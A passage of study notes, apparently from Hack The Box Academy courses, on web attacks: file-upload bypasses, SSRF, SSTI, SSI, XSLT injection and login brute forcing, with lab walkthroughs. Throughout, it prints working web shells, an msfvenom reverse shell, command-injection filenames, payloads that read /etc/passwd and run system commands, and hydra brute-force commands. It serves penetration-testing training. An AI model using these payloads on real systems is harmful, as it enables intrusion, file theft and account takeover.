># Stages = encoding the message multiple times (eg encode 3 times in base64)
># Layers = hiding the message inside multiple envelopes (eg a script inside a script etc)
>```

>[!code]- DOSfunscation (Windows)
>###### Setup
>```powershell
>git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
>cd Invoke-DOSfuscation
>Import-Module .\Invoke-DOSfuscation.psd1
>Invoke-DOSfuscation
>```
>###### Use
>```powershell
>Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
>Invoke-DOSfuscation> encoding
>Invoke-DOSfuscation\Encoding> 1
>```
### File Uploads (~1.5 hours)

>[!code]- Find the web app's language
>1. Enumerate `/index.ext` - where `.ext` is replaced with `php`, `aspx`, `asp` etc.
>```powershell
># There may be false negatives
>ffuf -u http://target.com/index.FUZZ -W /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt
>```
>2. Use Wappalyzer (browser extension)

>[!code]- Choose a suitable web shell
>###### Use a pre-existing one
>1. [phpbash](https://github.com/Arrexel/phpbash) for a bash-like web shell
>2. [Seclists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) for various web shells
>3. [Revshells](https://www.revshells.com/) for various web shells, including shells by Ivan Sincek or PentestMonkey
>
>###### Create a custom one
>```php
><!--PHP -->
><!-- executes a command passed to the ?cmd= parameter -->
><?php system($_REQUEST['cmd']); ?>
>```
>
>```powershell
># .NET
># executes a command passed to the ?cmd= parameter
><% eval request('cmd') %>
>```
>
>```bash
># powershell
># -p to set payload language
># -f to set output file language
>msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
>```
###### Bypass front-end validation

>[!code]- Capture and edit the upload request
>If, when we upload an image, it sends a request like so:
>
>![[Images/Pasted image 20250508064152.png]]
>
>We can edit the:
>- `filename="HTB.png` field
>- `content at the end of the request`
>
>![[Images/Pasted image 20250508064328.png]]
>
>To change our request into one that uploads PNG data to one that uploads PHP data.

>[!code]- Disable front-end validation
>###### Identify the problem code
>For example, if a webpage is preventing us from uploading certain file types, we can inspect the upload form to see the relevant source code:
>
>![[Images/Pasted image 20250508064618.png]]
>
>```html
><input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
>```
>
>It appears the `checkFile` function is being run on the input field. This function is written as:
>
>```javascript
>function checkFile(File) {
>...SNIP...
>    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
>        $('#error_message').text("Only images are allowed!");
>        File.form.reset();
>        $("#submit").attr("disabled", true);
>    ...SNIP...
>    }
>}
>```
>
>###### Delete the problem code
>>[!code]- Through the inspector tool
>>![[Images/Pasted image 20250508065212.png]]
>
>(Changes made to the code in this way will not persist through page refreshes).
###### Bypass back-end validation

>[!code]- Bypass a blacklist (e.g. ignore `.php`)
>Use Burp to fuzz the extension of the file in the POST request that sends the file:
>
>	(Un-tick the URL Encoding option to avoid encoding the `.` before the file extension)
>
>![[Images/Pasted image 20250512053746.png]]

>[!code]- Bypass a whitelist (e.g. must contain `.jpg`)
>###### Double extension (.jpg.php)
>If the backend checks for whether the extension CONTAINS a non-malicious extension, like `.jpg`, it might still be possible to bypass this check by uploading a file that contains a non-malicious extension but ends in the executing extension, like `.jpg.php`.
>
>###### Reverse double extension (.php.jpg)
>If the web server (e.g. Apache) is configured to execute a file's contents if the file name contains, for example, `php` or `phar`, then, even if the backend filter requires an uploaded file's extension to end in a non-executable extension, like `.jpg`, the web app would still execute the file `test.php.jpg` because the file name contains `php` AND it ends in `.jpg`.
>
>An example web server (Apache2) configuration: `/etc/apache2/mods-enabled/php7.4.conf`:
>
>![[Images/Pasted image 20250512064925.png]]
>
>###### Character injection (.php%00.jpg)
>>[!code]- Characters to inject
>>Certain characters can be misinterpreted by web applications. For example, `shell.php%00.jpg` works with PHP servers with version `5.X` or earlier, as it causes the PHP web server to end the file name after the `%00` and stores the file as `shell.php`.
>>
>>The same might work on a Windows server by injecting a colon (`:`) , eg `shell.aspx:.jpg`.
>>
>>![[Images/Pasted image 20250512065503.png]]
>
>>[!code]- Generate all permutations of character injections
>>This script generates all permutations of the file name, where the above characters are injected before and after both the php and jpG extensions.
>>
>>```powershell
>>for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
>>    for ext in '.php' '.phps'; do
>>        echo "shell$char$ext.jpg" >> wordlist.txt
>>        echo "shell$ext$char.jpg" >> wordlist.txt
>>        echo "shell.jpg$char$ext" >> wordlist.txt
>>        echo "shell.jpg$ext$char" >> wordlist.txt
>>    done
>>done
>>```

>[!code]- Bypass type filters (e.g. `Content-Type:` or `File-Content` must contain)
>###### Content Type
>
>>[!info]- What is the Content-Type
>>It's a header, set for either the form data or the general POST request. It's meant to describe the type of data that is encompassed within the POST data / form data:
>>
>>![[Images/Pasted image 20250514052600.png]]
>
>Capture a request in Burp.
>
>Fuzz the `Content-Type` value with Seclists Content-Type wordlist:
>```powershell
># download the wordlist
>wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
>
># filter to only images
>cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
>```
>
>Send the malicious request with the permitted `Content-Type` value (for example, `image/<something>`):
>
>![[Images/Pasted image 20250512193048.png]]
>
>###### MIME Type
>
>>[!info]- What is the MIME Type
>>It's the value assigned to data to describe what type of data it is, based on its general structure or format. The magic number of a file often is used to determine the file's mime type.
>
>Add a magic number at the top of the malicious data:
>
>![[Images/Pasted image 20250514053043.png]]
###### Other File Upload Attacks

>[!code]- HTML uploads
>Upload a HTML file which contains malicious JavaScript to perform [[Training Material/Web Apps#Cross-Site Scripting (XSS)|a stored XSS attack]].

>[!code]- Image uploads (with malicious metadata)
>###### XSS attack
>When the image's metadata is displayed, the XSS payload should be triggered, and the JS code will be executed to carry out the XSS attack.
>```powershell
>exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
>```
>Furthermore, if the image's MIME-type is changed to `text/html`, some web apps may show the image as a HTML document, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.

>[!code]- SVG uploads
>###### XSS attack
>Scalable Vector Graphics (SVG) images are XML-based, and they describe 2D vector graphics, which the browser renders into an image.
>
>We can modify their XML data to include an XSS payload (code taken from [this page](https://academy.hackthebox.com/module/136/section/1291)):
>
>![[Images/Pasted image 20250514063044.png]]
>
>Or to read PHP files without it being executed:
>
>```powershell
>php://filter/convert.base64-encode/resource=upload.php
>```
>
>![[Images/Pasted image 20250514190800.png]]
>
>The uploaded `htb.svg` file will trigger the XSS payload whenever its displayed.
>
>###### XXE attack
>Upload a SVG image that defines an entity called `xxe` which, when that entity is parsed, asks the system to retrieve the `/etc/passwd` file:
>
>![[Images/Pasted image 20250514063514.png]]
>
>Or try to read source files:
>
>![[Images/Pasted image 20250514065127.png]]

>[!code]- PDF, Word, PowerPoint etc.
>###### XXE attack
>PDF, Word documents, PowerPoint documents, among many others, all contains XML data, which, if a web applications allowed the upload of these documents and its document viewer (XML parser) was vulnerable to XXE, it could give us access to files on the host machine.

>[!code]- DoS attacks
>1. **Decompression Bomb:** upload a malicious ZIP file with a lot of nested ZIP archives within it. If the web app automatically unzips any uploaded ZIP files, we may be able to upload a malicious ZIP that, when unzipped, results to a file with petabytes of data (!)
>
>2. **Pixel Flood:** create any JPG image with any image size, then manually modify its compression data to say it has a size of `0xffff x 0xffff` which results in an image with a perceived size of 4 gigapixels. When the web app attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.
>
>3. **Upload an overly-large file**, if the web app doesn't limit the file size. Doing so may fill up the server's hard drive and cause it to crash or slow down considerably.
>   
>4. **Upload to a different folder**, if the web app allows uploads to escape the current directory (e.g. `../../../etc/passwd`). This could cause the server to crash.

>[!code]- Injections within the file name
>If we uploaded a file with the filename:
>```powershell
>file$(whoami).jpg
>file$(whoami).jpg
>file.jpg||whoami
>
># alternatively
><script>alert(window.origin);</script>
>file';select+sleep(5);--.jpg
>```
>
>And then the web app attempts to move the uploaded file with an OS command like:
>```powershell
>mv file /tmp
>```
>
>Then the OS would execute the injected command.

>[!exploit]- Skills Assessment - Hack The Box Academy
>A directory search reveals the page `/contact`:
>
>![[Images/Pasted image 20250515053805.png]]
>
>On it is a upload field which has front-end validation for images only:
>
>![[Images/Pasted image 20250515053853.png]]
>
>Deleting the validating HTML code circumnavigates the front-end validation:
>
>![[Images/Pasted image 20250515054001.png]]
>
>Capture an upload request in Burp:
>
>![[Images/Pasted image 20250515054535.png]]
>
>>[!code]- Fuzz the `filename=` value
>>Send an image, but change the PNG data to a PHP script AND fuzz the `filename=` value against the format `shell``<injection character>``<.jpg>``<php extension>` in differing orders.
>>
>>![[Images/Pasted image 20250515054645.png]]
>>
>>What we learn from the results:
>>- A blacklist appears to be in place, blocking `.php`, `.phps`, `.phtml` (but `.php2,3,4,5,6,7` and `.phar` appear to be allowed)
>>- A deeper filter is in place, perhaps reading the request's mime-type
>
>I take a different tack and try to upload an SVG to reveal a file using an XXE exploit. I'm able to read the contents of `/etc/passwd` this way:
>
>![[Images/Pasted image 20250516052309.png]]
>
>![[Images/Pasted image 20250516052335.png]]
>
>The `scipt.js` file reveals an `uploads.php` file and its location.:
>
>![[Images/Pasted image 20250516054345.png]]
>
>I can read this file using the SVG XXE exploit:
>
>![[Images/Pasted image 20250516054448.png]]
>
>Which injects the file as base64 code into the DOM:
>
>![[Images/Pasted image 20250516054526.png]]
>
>The decoded contents reveals the upload directory ( eg `/var/www/html/contact/user_feedback_submissions/250513_shell.php):
>
>![[Images/Pasted image 20250516054651.png]]
>
>With that in mind, I can upload an 'image' which has a jpg header (`0xDD 0xF8 0xDD 0xE0` but is followed by PHP code. Hopefully, by naming the file `shell.phar.jpg`, the server is configured to execute the file using a PHP interpreter simply because theres a php-like extension in its file name.
>
>![[Images/Pasted image 20250516060714.png]]
>
>The file is uploaded and I can execute its contents against the `cmd` parameter to execute commands:
>
>![[Images/Pasted image 20250516060841.png]]
>
>I `ls` the contents of the `/` directory:
>
>![[Images/Pasted image 20250516061112.png]]
>
>And then `cat` the contents of the flag:
>
>![[Images/Pasted image 20250516061138.png]]
### SSRF (Server Side Request Forgery)

>[!code]- Discover the vulnerability (used throughout the below sections)
>Imagine we have a website which lets us prompt the for the availability of company on a particular date:
>
>![[Images/Pasted image 20250521064822.png]]
>
>Doing so sends a POST request which includes a `dateserver` parameter and a `date` parameter. The response received is `available` in that particular instance:
>
>![[Images/Pasted image 20250521064917.png]]
>
>If we set the `dateserver` parameter to retrieve the server's own `index.php` file, we receive as a response the HTML for the index page:
>
>![[Images/Pasted image 20250521065032.png]]
>
>This suggests that the server is taking the value of the `dateserver` parameter and querying it, then sending back to us the response.
>
>Another example involves using the `dateserver` parameter to query one of the server's internal ports to see what response we get. The server returns a `failed to connect` error message, which suggests port 81 is closed:
>
>![[Images/Pasted image 20250521065230.png]]

>[!code]- Port scan
>The vulnerable POST request can cause the server to see whether a particular internal port is open or closed. In this example, the server returns a message which suggests its port 81 is closed:
>
>![[Images/Pasted image 20250521065343.png]]
>
>Create a txt file containing numbers up to 10,000:
>```powershell
>seq 1 10000 > ports.txt
>```
>
>Perform a fuzz of the port number using the SSRF vulnerability:
>```powershell
># Fuzz top 10,000 ports
># Filter requests containing 'Faield to connect to'
>ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
>```
>
>>[!exploit]- Example (Hack The Box Academy)
>>The web server contains a button to see whether there is availability on a certain day. Clicking the `Check Availability` button submits a POST request, with the request data containing a `dateserver` value:
>>
>>![[Images/Pasted image 20250523054922.png]]
>>
>>![[Images/Pasted image 20250523055006.png]]
>>
>>If we assume the web server is receiving a response from whatever server is defined within this `dateserver` value, we can change the server to one that might not exist, to see what response we get:
>>
>>![[Images/Pasted image 20250523055214.png]]
>>
>>We can fuzz the top 10,000 ports to attempt to see which ones are open and which are closed (like port 12345 is):
>>
>>![[Images/Pasted image 20250523055308.png]]
>>
>>This fuzz scan suggests port 3306 and 8000 are internal ports which are open. We can set the `dateserver` value to query the internal port `8000` to see what response we get (we get the flag):
>>
>>![[Images/Pasted image 20250523055157.png]]

>[!code]- Accessing files
>Fuzz for directories available on the `dateserver.htb` server:
>```powershell
>ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
>```
>
>Fuzz for files outside the web server (or the web server's app source files):
>```powershell
>dateserver=file:///etc/passwd&date=2024-01-01
>```
>>[!exploit]- Example (Hack The Box)
>>We access the `admin.php` web page on the `dateserver.htb` server, via the SSRF vulnerability. Without the SSRF vulnerability we wouldn't be able to reach the `dateserver.htb` server.
>>
>>![[Images/Pasted image 20250523070325.png]]

>[!code]- Accessing other internal services via the gopher protocol
>>[!info]- Overcoming GET-based SSRF vulnerability limitations
>>Sometimes a service is found which requires us to send POST data to it in order to access it. For example, if we found an `admin.php` login portal on an internal HTTP server, we wouldn't typically be able to fuzz the credentials via a GET request. The Gopher protocol, however, lets us send POST-like data in a GET request. The receiving service has to have a Gopher compiler for this approach to work.
>
>If we want to send this POST request via the GET-based SSRF vulnerability (`dateserver=http://dateserver.htb/data-to-send-here&date=2024-01-01`):
>```powershell
>POST /admin.php HTTP/1.1
>Host: dateserver.htb
>Content-Length: 13
>Content-Type: application/x-www-form-urlencoded
>
>adminpw=admin
>
>```
>We can convert it into a gopher request:
>- URL encode all special characters (including spaces (`%20`) and newlines (`%0D%0A`))
>- Prefix the data with the gopher URL scheme, the target host and port, and an underscore:
>  
>>[!tip]- Converting a POST request into the Gopher format can be done automatically using the [Gopherus](https://github.com/tarunkant/Gopherus) tool. It supports the creation of URLs for the following services:
>>MySQL
>>PostgreSQL
>>FastCGI
>>Redis
>>SMTP
>>Zabbix
>>pymemcache
>>rbmemcache
>>phpmemcache
>>dmpmemcache
>  
>```powershell
>gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
>```
>
>We'll probably need to URL-encode again the whole URL above before setting it as the value for the `dateserver` parameter, to ensure its delivered as intended to the Gopher protocol handler:
>
>```powershell
>dateserver=gopher%3a//dateserver.htb%3a80/\_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
>```
>
>To run Gopherus:
>```powershell
>python2.7 gopherus.py --exploit smtp
>```
>
>![[Images/Pasted image 20250523063441.png]]

>[!code]- Blind SSRF
>Occurs when the response to a SSRF vulnerability is not directly displayed to us.
>
>For example, the web app does not include the HTML response of the coerced request. Instead, it simply lets us know that the date is unavailable:
>
>![[Images/Pasted image 20250715063506.png]]
>
>We can use Blind SSRF if the response differs at least somewhat. For example, when doing a port scan, a close port generates the message `Something went wrong!`.
>
>![[Images/Pasted image 20250715063706.png]]
>
>Whereas an open port generates the message `Date is unavailable. Please choose a different date!`.
>
>![[Images/Pasted image 20250715063716.png]]
>
>>[!exploit]- Example (blind SSRF to show two open ports)
>>The responses were filtered based on their content.
>>![[Images/Pasted image 20250715075209.png]]

>[!code]- Prevention
>- Whitelist of acceptable remote data sources
>- Restrict the URL scheme in the request (to disable gopher requests)
>- Input sanitisation
>- Firewall rules prevent requests to significant systems
>- Network segmentation can prevent access to other systems
### SSTI (Server Side Template Injection)

>[!info]- Templating & SSTI
>###### Templating
>A template engine is software that combines pre-defined templates to dynamically generate data to be served by the web server. It also allows the injection of variables and objects. For example:
>
>1. Having a footer or header coded once, it can then be injected into any other web page dynamically
>2. Having a list of names and using a for loop to output them
>   
>![[Images/Pasted image 20250715080623.png]]
>
>###### SSTI
>An attacker injects code into a template that is later rendered by the server. If the injected code is malicious, the server potentially executes the code during the rendering process.
>
>SSTI can occur when user input is injected into the template string, rather than after the template has been rendered. This allows an attacker to manipulate what the server renders.

>[!code]- Identify SSTI
>###### Manually
>Inject a payload consisting of a string which contains chars typically used by templating engines:
>
>![[Images/Pasted image 20250715082003.png]]
>
>>[!code]- Webpage with a SSTI vulnerability
>>![[Images/Pasted image 20250715082054.png]]
>
>Injecting the above mentioned payload gives an error:
>
>![[Images/Pasted image 20250715082213.png]]
>
>###### Automatically (tplmap)
>```powershell
>python3 sstimap.py -u http://172.17.0.2/index.php?name=test
>
># Download a remote file to local machine
>python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
>
># Execute a system command
>python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
>
># Obtain an interactive shell
>python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
>```
>>[!code]- Example (stimap.py -u http://172.17.0.2/index.php?name=test)
>>![[Images/Pasted image 20250717063724.png]]
>

>[!code]- Identify the templating engine
>The successful injection of certain strings can lead us to identify the templating engine in effect (follow green arrow for success, red for failure):
>
>![[Images/Pasted image 20250715082403.png]]
>
>`{{7*'7'}}` will equal `7777777` with Jinja and `49` with Twig
>
>>[!code]- Example of using the graph
>>![[Images/Pasted image 20250715082538.png]]

>[!code]- PayloadsAllTheThings - SSTI
>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

>[!code]- Exploiting SSTI (Jinja2)
>###### Information Disclosure
>```powershell
>{{ config.items() }} # config file
>```
>>[!code]- Result
>>![[Images/Pasted image 20250715085544.png]]
>
>```powershell
>{{ self.__init__.__globals__.__builtins__ }} # reveal Python variables and built-in functions
>```
>>[!code]- Result
>>![[Images/Pasted image 20250715085645.png]]
>
>###### Local File Inclusion (LFI)
>```python
>{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }} # python
>```
>>[!code]- Result
>>![[Images/Pasted image 20250715085827.png]]
>
>###### Remote Code Execution
>```python
>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} # python
>```
>>[!code]- Result
>>![[Images/Pasted image 20250715090028.png]]

>[!code]- Exploiting SSTI (Twig)
>###### Information Disclosure
>```python
>{{ \_self }} # (without the backslash) get info about current template
>```
>>[!code]- Example
>>![[Images/Pasted image 20250717062827.png]]
>
>###### Local File Inclusion
>Twig doesn't directly have an internal function to read files, but the PHP web framework Symfony does due to it defining additional Twig filters.
>```python
>{{ "/etc/passwd"|file_excerpt(1,-1) }}
>```
>>[!code]- Example
>>![[Images/Pasted image 20250717063046.png]]
>
>###### Remote Code Execution
>```python
>{{ ['id'] | filter('system') }} # use PHP's built-in system function
>```
>>[!code]- Example
>>![[Images/Pasted image 20250717063252.png]]
### SSI (Server-Side Includes)

>[!info]- Information
>###### Background
>SSI is a web technology to create dynamic content on HTML pages. The use of SSI can often be inferred from the file extensions (`.shtml`, .`shtm`, `stm`). But web servers can be configured to support SSI directives in arbitrary file extensions.
>
>###### SSI Directives
>SSI uses directives to dynamically generate content to a static HTML page. These directives consist of:
>- name (the directives name)
>- parameter name (one or more parameters)
>- value (one or more parameter values)
>  
>```html
># General directive format
><!--#name param1="value1" param2="value" -->
>
># Examples
>
># prints the environmental variables
><!--#printenv -->
>
># changes the SSI configuration, for example, changing the default error message
><!--#config errmsg="Error!" -->
>
># prints the value of any variable
><!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
>
># executes the command in the cmd parameter
><!--#exec cmd="whoami" -->
>
># includes the file specified in the virtual parameter
><!--#include virtual="index.html" -->
>```

>[!code]- Exploit SSI
>###### Identify
>We find the following webpage:
>![[Images/Pasted image 20250717070348.png]]
>
>After we enter our name into the text box, we get directed to `/page.shtml`
>![[Images/Pasted image 20250717070414.png]]
>
>###### Exploit
>If we enter `<!--#printenv -->` into the text box, we get:
>![[Images/Pasted image 20250717070514.png]]
>
>If we enter `<!--#exec cmd="id" -->`, we get:
>![[Images/Pasted image 20250717070601.png]]
### XSLT Injection (eXtensible Stylesheet Language Transformation Injection)

>[!info]- Information
>XSLT is a language enabling the transformation of XML documents. For example, it can select specific nodes from an XML document and change the XML structure.
>
>XSLT data is structured similarly to XML, but it contain XSL elements within nodes prefixed with `xsl`. Common XSL elements include:
>- `<xls:template>` indicates an XSL template
>- `<xsl:value-of>` extracts the value of the XML node specified within the `select` attribute
>- `<xsl:for-each>` enables looping over all XML nodes specified in the `select` attribute
>
>>[!code]- Example XSLT data
>>Example XML document:
>>
>>![[Images/Pasted image 20250717071537.png]]
>>
>>Example XSLT document. It is used to output all fruits contained within the XML document as well as their colour:
>>
>>![[Images/Pasted image 20250717071447.png]]
>>
>>The output would be:
>>```
>>Here are all the fruits:
>>   Apple (Red)
>>   Banana (Yellow)
>>   Strawberry (Red)
>>```

>[!code]- Identifying & Exploiting
>>[!code]- Identifying XSLT Injection
>>A sample web app displays basic information about Academy modules:
>>
>>![[Images/Pasted image 20250717072010.png]]
>>
>>At the bottom of the page we can provide a username which is then inserted into the headline at the top of the list:
>>
>>![[Images/Pasted image 20250717072037.png]]
>>
>>If we suppose our input is being injected directly into a XSLT file, we may be able to manipulate the output. Entering a broken XML tag causes an error 500:
>>
>>![[Images/Pasted image 20250717072228.png]]
>
>###### Information Disclosure
>```html
># Inject these XSLT elements:
>Version: <xsl:value-of select="system-property('xsl:version')" />
><br/>
>Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
><br/>
>Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
><br/>
>Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
><br/>
>Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
>```
>>[!code]- Result
>>![[Images/Pasted image 20250717072519.png]]
>
>###### Local File Inclusion
>Whether a payload will work will depend upon the XSLT version and the configuration of the XSLT library.
>```html
><xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
>
><xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
>```
>>[!code]- Result (<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />)
>>![[Images/Pasted image 20250717073258.png]]
>>
>###### Remote Code Execution
>If the XSLT processor support PHP functions, we can call a PHP function that executes local system command.
>```xml
><xsl:value-of select="php:function('system','id')" />
>```
>>[!code]- Result
>>![[Images/Pasted image 20250717073426.png]]
### Login Brute Forcing

>[!code]- Filter a password list to a password policy
>Password policy:
>- **Minimum length:** 8 chars
>- **Must include:** at least one upper case letter, lower case letter, one number
>
>```powershell
># Minimum length of 8
>grep -E '^.{8,}$' password.list > output.txt
>
># At least one upper/lower case character
>grep -E '[A-Z]' password.list > output.txt
>grep -E '[a-z]' password.list > output.txt
>
># At least one number
>grep -E '[0-9]' password.list > output.txt
>```

>[!code]- Basic HTTP Authentication
>>[!code]- The general process
>>1. User requests access to a webpage
>>2. Server responds with a `401 Unauthorized` status code and a `WWW-Authenticate` header, thus prompting the user's browser to present a login box
>>3. Once the user provides a username and password, the browser concatenates them into a single string, separated by a colon
>>4. The string is then base64 encoded and sent within the `Authorization` header of any subsequent requests, using the format `Basic <encoded_credentials>`
>>5. The server decodes the credentials, verifies them, and grants or denies access accordingly
>>
>>The headers for Basic Auth in a HTTP GET request:
>>
>>![[Images/Pasted image 20250722081708.png]]
>
>###### Brute forcing
>```powershell
>hydra -l basic-auth-user -P password_list 127.0.0.1 http-get / -s 81
>
>medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
>```

>[!code]- Login Forms
>>[!code]- Explained
>>Example login form HTML:
>>
>>![[Images/Pasted image 20250722083458.png]]
>>
>>Upon clicking the `submit` button, the following POST request is sent to `/login`:
>>
>>![[Images/Pasted image 20250722083537.png]]
>>
>>- The `Content-Type` header specifies how the data is encoded in the request body
>>- The `Content-Length` header indicates the size of the data being sent
>
>###### Brute forcing
>
>```powershell
>hydra [options] target http-post-form "path:params:condition_string"
>hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
>hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
>hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
>
># Condition string
># F=... to determine when a login attempt has failed
># For example `F=Invalid credentials`
>
># S=... to determine when a login attempt has succeeded
># For example `S=302` or `S=Dashboard`
>
># Altogether now
>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
>
>medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"
>```

>[!code]- Custom wordlists
>###### Username variations
>```powershell
># Install Anarchy
>sudo apt install ruby -y
>git clone https://github.com/urbanadventurer/username-anarchy.git
>cd username-anarchy
>
># List variation options
>./username-anarchy -l
>
># Create username variations
>./username-anarchy Jane Smith > jane_smith_usernames.txt
>```
>###### Password variations
>>[!code]- CUPP example
>>It takes OSINT information to generate passwords.
>>
>>![[Images/Pasted image 20250724065706.png]]
>
>```powershell
># Install
>sudo apt install cupp -y
>
># Interactive mode
>cupp -i
>```
>###### Password policies
>- Minimum length: `grep -E '^.{6,}$'`
>- Must include at least one uppercase letter: `grep -E '[A-Z]'`
>- Must include at least one lowercase letter: `grep -E '[a-z]'`
>- Must include at least one number: `grep -E '[0-9]'`
>- Must include at least two special chars (set given): `grep -E '([!@#$%^&*].*){2,}'`